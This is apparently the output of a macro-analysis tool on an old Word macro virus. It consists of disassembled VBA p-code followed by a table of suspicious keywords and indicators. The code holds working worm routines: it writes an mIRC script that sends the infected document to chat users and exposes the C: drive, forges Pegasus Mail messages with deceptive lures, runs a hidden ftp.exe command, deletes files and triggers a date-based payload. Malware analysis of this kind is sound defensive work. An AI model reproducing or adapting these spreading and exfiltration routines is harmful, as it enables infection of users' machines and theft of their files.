' 	LitStr 0x0010 "c:\mirc\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #386:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #387:
' 	Ld set_dir 
' 	LitStr 0x0012 "c:\program~1\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MrJim"
' 	LitStr 0x001A "c:\program~1\mirc\mirc.ini"
' 	LitStr 0x0005 "ident"
' 	LitStr 0x0006 "userid"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #388:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #389:
' 	Ld set_dir 
' 	LitStr 0x0012 "c:\program~1\mirc\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "off"
' 	LitStr 0x001A "c:\program~1\mirc\mirc.ini"
' 	LitStr 0x0004 "warn"
' 	LitStr 0x0006 "fserve"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #390:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #391:
' 	OnError Skip_attr 
' Line #392:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #393:
' 	Ld set_dir 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #394:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #395:
' 	Ld set_dir 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #396:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #397:
' 	Label Skip_attr 
' Line #398:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #399:
' 	OnError end_macro 
' Line #400:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #401:
' 	Ld set_dir 
' 	LitStr 0x000A "script.ini"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #402:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #403:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #404:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #405:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future"
' 	PrintItemNL 
' Line #406:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #407:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me"
' 	PrintItemNL 
' Line #408:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #409:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "n2=on 1:TEXT:*progråtta*:#:/mode $chan +o $nick"
' 	PrintItemNL 
' Line #410:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #411:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\ config.sys"
' 	PrintItemNL 
' Line #412:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #413:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick "
' 	Ld active_doc 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0002 " }"
' 	PrintItemNL 
' Line #414:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #415:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick "
' 	Ld active_doc 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0002 " }"
' 	PrintItemNL 
' Line #416:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #417:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #418:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #419:
' 	Label Pegasus 
' Line #420:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #421:
' 	LitStr 0x0015 "c:\pmail\winpm-32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "c:\pmail\"
' 	St pega_dir 
' 	BoS 0x0000 
' 	GoTo past_pega_dir 
' 	EndIf 
' Line #422:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #423:
' 	LitStr 0x0014 "c:\mail\winpm-32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "c:\pmail\"
' 	St pega_dir 
' 	BoS 0x0000 
' 	GoTo past_pega_dir 
' 	EndIf 
' Line #424:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #425:
' 	LitStr 0x001F "c:\program~1\pmail\winpm-32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0013 "c:\program~1\pmail\"
' 	St pega_dir 
' 	BoS 0x0000 
' 	GoTo past_pega_dir 
' 	EndIf 
' Line #426:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #427:
' 	LitStr 0x001D "c:\program\pmail\winpm-32.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "c:\program\pmail\"
' 	St pega_dir 
' 	BoS 0x0000 
' 	GoTo past_pega_dir 
' 	EndIf 
' Line #428:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #429:
' 	GoTo no_mail 
' Line #430:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #431:
' 	Label past_pega_dir 
' Line #432:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #433:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #434:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #435:
' 	LitStr 0x0006 "\*.pmw"
' 	MemStWith FileName 
' Line #436:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #437:
' 	Ld pega_dir 
' 	MemStWith LookIn 
' Line #438:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #439:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #440:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #441:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #442:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #443:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #444:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #445:
' 	ArgsMemCallWith Execute 0x0000 
' Line #446:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #447:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St pega_mail 
' Line #448:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #449:
' 	EndWith 
' Line #450:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #451:
' 	LitDI2 0x0005 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St get_rand 
' Line #452:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #453:
' 	Ld Application 
' 	MemLd UserName 
' 	St user_name 
' Line #454:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #455:
' 	Ld get_rand 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x00F8 "Hi! Quite some time has passed since my last mail, I hope you're not too mad at me. I haven't had time to write for several reasons. Anyway there is a quite interesting document attached in this mail, check it out and tell me what you think. Cya / "
' 	Ld user_name 
' 	Concat 
' 	St random_message 
' 	EndIf 
' Line #456:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #457:
' 	Ld get_rand 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0140 "Hello, yesterday when I was surfing the web a friend told me about this great game. It's called Utopia, have you ever heard of it? It's very cool and I think you would like it, I found this beginners guide on the net, you need it incase you want to succed and become strong. The guide is attached to the message. Bye! / "
' 	Ld user_name 
' 	Concat 
' 	St random_message 
' 	EndIf 
' Line #458:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #459:
' 	Ld get_rand 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0150 "HHHHhhhEEEeLLooo :) Somedays ago I was chatting on IRC on some warez channels and one guy offered me 3 different ftp sites with cracked versions of Quake III arena, all of them works! In case you doesn't have mIRC installed, install it! It's a very cool chat program. The Ftp's login and password are attached to this message. Ok Cya / "
' 	Ld user_name 
' 	Concat 
' 	St random_message 
' 	EndIf 
' Line #460:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #461:
' 	Ld get_rand 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x00C1 "Hiya, I really need your help. This document has to be done for friday and it probably contains a lot of misspellings etc etc. Could you please read it trough and check if you see something? / "
' 	Ld user_name 
' 	Concat 
' 	St random_message 
' 	EndIf 
' Line #462:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #463:
' 	Ld get_rand 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0078 "Hehehe guess what I found! Tons of XXX passwords and some other cool stuff, it's attached to the message. Have fun ;) / "
' 	Ld user_name 
' 	Concat 
' 	St random_message 
' 	EndIf 
' Line #464:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #465:
' 	Ld pega_mail 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo no_mail 
' 	EndIf 
' Line #466:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #467:
' 	Ld pega_mail 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #468:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #469:
' 	LitDI2 0x0002 
' 	Ld mail_line1 
' 	LineInput 
' Line #470:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #471:
' 	LitDI2 0x0002 
' 	Ld mail_line2 
' 	LineInput 
' Line #472:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #473:
' 	LitDI2 0x0002 
' 	Ld mail_line3 
' 	LineInput 
' Line #474:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #475:
' 	LitDI2 0x0002 
' 	Ld mail_line4 
' 	LineInput 
' Line #476:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #477:
' 	LitDI2 0x0002 
' 	Ld mail_line5 
' 	LineInput 
' Line #478:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #479:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #480:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #481:
' 	Label file_Ready 
' Line #482:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #483:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x2710 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St random_1 
' Line #484:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #485:
' 	Ld pega_dir 
' 	LitStr 0x0006 "\mail\"
' 	Concat 
' 	Ld random_1 
' 	Concat 
' 	LitStr 0x0004 ".pmw"
' 	Concat 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #486:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #487:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	Ld mail_line1 
' 	PrintItemNL 
' Line #488:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #489:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "SY:0"
' 	PrintItemNL 
' Line #490:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #491:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	Ld mail_line3 
' 	PrintItemNL 
' Line #492:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #493:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	Ld mail_line5 
' 	PrintItemNL 
' Line #494:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #495:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CC:"
' 	PrintItemNL 
' Line #496:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #497:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "EN:0"
' 	PrintItemNL 
' Line #498:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #499:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "CS:0"
' 	PrintItemNL 
' Line #500:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #501:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "RC:0"
' 	PrintItemNL 
' Line #502:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #503:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "DC:0"
' 	PrintItemNL 
' Line #504:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #505:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "UR:0"
' 	PrintItemNL 
' Line #506:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #507:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "SS:0"
' 	PrintItemNL 
' Line #508:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #509:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "SG:0"
' 	PrintItemNL 
' Line #510:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #511:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "MI:1"
' 	PrintItemNL 
' Line #512:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #513:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "ID:<Default>"
' 	PrintItemNL 
' Line #514:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #515:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "EX:0"
' 	PrintItemNL 
' Line #516:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #517:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "AT:"
' 	Ld active_doc 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0009 ",Binary,1"
' 	PrintItemNL 
' Line #518:
' 	QuoteRem 0x0000 0x0002 "45"
' Line #519:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "RT: 1"
' 	PrintItemNL 
' Line #520:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #521:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "FL:0"
' 	PrintItemNL 
' Line #522:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #523:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #524:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #525:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	Ld random_message 
' 	PrintItemNL 
' Line #526:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #527:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #528:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #529:
' 	Label no_mail 
' Line #530:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #531:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Tasks 
' 	MemLd Count 
' 	For 
' Line #532:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #533:
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "ADDRESS BOOK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	St da_outlook 
' 	BoS 0x0000 
' 	GoTo out_look 
' 	EndIf 
' Line #534:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #535:
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "ICQMSGAPI WINDOW"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i_connection 
' 	EndIf 
' Line #536:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #537:
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SOCKETS WINDOW"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i_connection 
' 	EndIf 
' Line #538:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #539:
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000E "SECTION WINDOW"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i_connection 
' 	EndIf 
' Line #540:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #541:
' 	Ld x 
' 	Ld Application 
' 	ArgsMemLd Tasks 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0011 "INTERNET EXPLORER"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo i_connection 
' 	EndIf 
' Line #542:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #543:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #544:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #545:
' 	GoTo end_macro 
' Line #546:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #547:
' 	Label out_look 
' Line #548:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #549:
' 	Label i_connection 
' Line #550:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #551:
' 	LitStr 0x0029 "command.com /c ftp.exe -n -s:c:\msdos.dll"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #552:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #553:
' 	Label end_macro 
' Line #554:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #555:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo payload 
' 	EndIf 
' Line #556:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #557:
' 	GoTo the_end 
' Line #558:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #559:
' 	Label payload 
' Line #560:
' 	QuoteRem 0x0000 0x0002 "10"
' Line #561:
' 	LitStr 0x0059 "[Mr Jim/SeptiC/TI] - Do you have what it takes to become an international bussiness man!?"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #562:
' Line #563:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #564:
' Line #565:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #566:
' Line #567:
' 	LineCont 0x0008 08 00 00 00 21 00 00 00
' 	Ld msoTextEffect29 
' 	LitStr 0x0016 "[Mr Jim]/SeptiC/TI '99"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitStr 0x000B "Arial Black"
' 	LitR8 0x0000 0x0000 0x0000 0x4042 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0x6666 0x6666 0x7666 0x405E 
' 	LitR8 0x0000 0x0000 0xF800 0x4063 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #568:
' Line #569:
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemLd SplitSpecial 
' 	Ld wdPaneNone 
' 	Eq 
' 	IfBlock 
' Line #570:
' 	Ld wdNormalView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #571:
' 	ElseBlock 
' Line #572:
' Line #573:
' 	Ld wdNormalView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #574:
' 	EndIfBlock 
' Line #575:
' Line #576:
' 	Label the_end 
' Line #577:
' Line #578:
' 	EndSub 
' Line #579:
' Line #580:
' Line #581:
' Line #582:
' Line #583:
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' Line #588:
' Line #589:
' Line #590:
' Line #591:
' Line #592:
' Line #593:
' Line #594:
' Line #595:
' Line #596:
' Line #597:
' Line #598:
' Line #599:
' Line #600:
' Line #601:
' Line #602:
' Line #603:
' Line #604:
' Line #605:
' Line #606:
' Line #607:
' Line #608:
' Line #609:
' Line #610:
' Line #611:
' Line #612:
' Line #613:
' Line #614:
' Line #615:
' Line #616:
' Line #617:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |config.dll          |Executable file name                         |
|IOC       |msdos.dll           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |32.exe              |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

